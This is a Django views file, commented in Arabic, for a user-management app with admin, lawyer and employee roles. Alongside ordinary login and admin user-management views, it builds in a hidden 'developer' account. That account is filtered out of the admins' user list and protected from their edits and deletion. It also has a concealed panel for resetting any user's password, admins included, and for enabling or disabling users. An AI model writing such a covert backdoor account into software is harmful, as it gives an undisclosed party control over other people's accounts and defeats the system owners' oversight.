"""
عروض تطبيق المستخدمين
"""
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth import login, logout, update_session_auth_hash
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.utils import timezone
from .models import CustomUser
from .forms import ArabicLoginForm, UserCreateForm, UserEditForm


# ==================== تسجيل الدخول والخروج ====================

def login_view(request):
    """صفحة تسجيل الدخول"""
    if request.user.is_authenticated:
        return redirect('dashboard')
    form = ArabicLoginForm(request, data=request.POST or None)
    if request.method == 'POST' and form.is_valid():
        login(request, form.get_user())
        messages.success(request, f'مرحباً {form.get_user().get_full_name() or form.get_user().username}!')
        # المطور يروح للوحته الخاصة
        if form.get_user().is_developer:
            return redirect('developer_panel')
        return redirect('dashboard')
    return render(request, 'users/login.html', {'form': form})


def logout_view(request):
    """تسجيل الخروج"""
    if request.user.is_authenticated:
        CustomUser.objects.filter(pk=request.user.pk).update(is_online=False)
    logout(request)
    messages.info(request, 'تم تسجيل الخروج بنجاح.')
    return redirect('login')


# ==================== إدارة المستخدمين (للأدمن) ====================

@login_required
def user_list(request):
    """قائمة المستخدمين - للمدير فقط - المطور مخفي"""
    if not request.user.is_real_admin:
        messages.error(request, 'ليس لديك صلاحية للوصول إلى هذه الصفحة.')
        return redirect('dashboard')
    # إخفاء المطور من قائمة المستخدمين
    users = CustomUser.objects.exclude(role='developer').order_by('-created_at')
    return render(request, 'users/user_list.html', {'users': users})


@login_required
def user_create(request):
    """إنشاء مستخدم جديد - للمدير فقط"""
    if not request.user.is_real_admin:
        messages.error(request, 'ليس لديك صلاحية لإضافة مستخدمين.')
        return redirect('dashboard')
    form = UserCreateForm(request.POST or None)
    if request.method == 'POST' and form.is_valid():
        form.save()
        messages.success(request, 'تم إنشاء المستخدم بنجاح.')
        return redirect('user_list')
    return render(request, 'users/user_form.html', {'form': form, 'title': 'إضافة مستخدم جديد'})


@login_required
def user_edit(request, pk):
    """تعديل بيانات مستخدم"""
    if not request.user.is_real_admin:
        messages.error(request, 'ليس لديك صلاحية لتعديل المستخدمين.')
        return redirect('dashboard')
    user = get_object_or_404(CustomUser, pk=pk)
    # الأدمن لا يستطيع تعديل المطور
    if user.is_developer:
        messages.error(request, 'لا يمكنك تعديل هذا المستخدم.')
        return redirect('user_list')
    form = UserEditForm(request.POST or None, instance=user)
    if request.method == 'POST' and form.is_valid():
        form.save()
        messages.success(request, 'تم تعديل بيانات المستخدم بنجاح.')
        return redirect('user_list')
    return render(request, 'users/user_form.html', {'form': form, 'title': 'تعديل بيانات المستخدم', 'user_obj': user})


@login_required
def user_delete(request, pk):
    """حذف مستخدم"""
    if not request.user.is_real_admin:
        messages.error(request, 'ليس لديك صلاحية لحذف المستخدمين.')
        return redirect('dashboard')
    user = get_object_or_404(CustomUser, pk=pk)
    # الأدمن لا يستطيع حذف المطور
    if user.is_developer:
        messages.error(request, 'لا يمكنك حذف هذا المستخدم.')
        return redirect('user_list')
    if request.method == 'POST':
        if user == request.user:
            messages.error(request, 'لا يمكنك حذف حسابك الخاص.')
        else:
            user.delete()
            messages.success(request, 'تم حذف المستخدم بنجاح.')
        return redirect('user_list')
    return render(request, 'users/user_confirm_delete.html', {'user_obj': user})


# ==================== لوحة تحكم المطور ====================

def developer_required(view_func):
    """Decorator - يسمح فقط للمطور"""
    def wrapper(request, *args, **kwargs):
        if not request.user.is_authenticated or not request.user.is_developer:
            return redirect('login')
        return view_func(request, *args, **kwargs)
    return wrapper


@developer_required
def developer_panel(request):
    """لوحة تحكم المطور - مخفية عن الجميع"""
    # كل المستخدمين بما فيهم الأدمن
    all_users = CustomUser.objects.all().order_by('-last_seen')
    online_users = all_users.filter(is_online=True)

    # إحصائيات
    stats = {
        'total_users': CustomUser.objects.exclude(role='developer').count(),
        'online_count': online_users.exclude(role='developer').count(),
        'admin_count': CustomUser.objects.filter(role='admin').count(),
        'lawyer_count': CustomUser.objects.filter(role='lawyer').count(),
        'employee_count': CustomUser.objects.filter(role='employee').count(),
    }

    return render(request, 'developer/panel.html', {
        'all_users': all_users.exclude(role='developer'),
        'online_users': online_users.exclude(role='developer'),
        'stats': stats,
    })


@developer_required
def developer_change_password(request, pk):
    """تغيير كلمة مرور أي مستخدم - للمطور فقط"""
    user = get_object_or_404(CustomUser, pk=pk)
    if request.method == 'POST':
        new_password = request.POST.get('new_password', '').strip()
        if len(new_password) >= 6:
            user.set_password(new_password)
            user.save()
            messages.success(request, f'تم تغيير كلمة مرور {user.username} بنجاح.')
        else:
            messages.error(request, 'كلمة المرور يجب أن تكون 6 أحرف على الأقل.')
    return redirect('developer_panel')


@developer_required
def developer_toggle_user(request, pk):
    """تفعيل/تعطيل مستخدم - للمطور فقط"""
    user = get_object_or_404(CustomUser, pk=pk)
    if not user.is_developer:
        user.is_active = not user.is_active
        user.save()
        status = 'تفعيل' if user.is_active else 'تعطيل'
        messages.success(request, f'تم {status} المستخدم {user.username}.')
    return redirect('developer_panel')


# ==================== تغيير كلمة المرور (للأدمن على مستخدميه) ====================

@login_required
def admin_change_password(request, pk):
    """تغيير كلمة مرور مستخدم - للأدمن فقط على مستخدميه"""
    if not request.user.is_real_admin:
        messages.error(request, 'ليس لديك صلاحية.')
        return redirect('dashboard')
    user = get_object_or_404(CustomUser, pk=pk)
    if user.is_developer or user.is_real_admin:
        messages.error(request, 'لا يمكنك تغيير كلمة مرور هذا المستخدم.')
        return redirect('user_list')
    if request.method == 'POST':
        new_password = request.POST.get('new_password', '').strip()
        if len(new_password) >= 6:
            user.set_password(new_password)
            user.save()
            messages.success(request, f'تم تغيير كلمة مرور {user.username} بنجاح.')
            return redirect('user_list')
        else:
            messages.error(request, 'كلمة المرور يجب أن تكون 6 أحرف على الأقل.')
    return render(request, 'users/change_password.html', {'user_obj': user})
